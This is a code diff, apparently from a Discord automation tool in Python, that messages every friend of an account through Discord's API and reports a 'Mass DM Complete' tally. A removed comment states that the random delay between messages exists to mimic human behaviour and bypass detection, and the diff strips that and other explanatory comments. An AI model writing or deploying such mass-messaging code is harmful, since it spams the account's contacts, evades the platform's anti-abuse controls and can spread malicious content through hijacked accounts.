-                        if friend.get('type') == 1: # Friend
+                        if friend.get('type') == 1:
                             f_id = friend['id']
                             f_user = friend['user']['username']
                             
-                            # Create DM channel
                             r_dm = requests.post('https://discord.com/api/v9/users/@me/channels', 
                                                headers=headers, json={"recipient_id": f_id})
                             if r_dm.status_code == 200:
                                 chan_id = r_dm.json()['id']
-                                # Send message
                                 final_msg = message.replace("@friend", f"<@{f_id}>")
                                 r_send = requests.post(f'https://discord.com/api/v9/channels/{chan_id}/messages', 
                                                      headers=headers, json={"content": final_msg})
                                 if r_send.status_code == 200:
                                     total_sent += 1
                                     details += f"Sent to: `{f_user}`\n"
-                                    # Use a variable delay to mimic human behavior and bypass detection
                                     time.sleep(random.uniform(1.0, 5.0)) 
                 
             return f"**Mass DM Complete!**\nTotal Sent: `{total_sent}`\n\n{details[:1500]}"
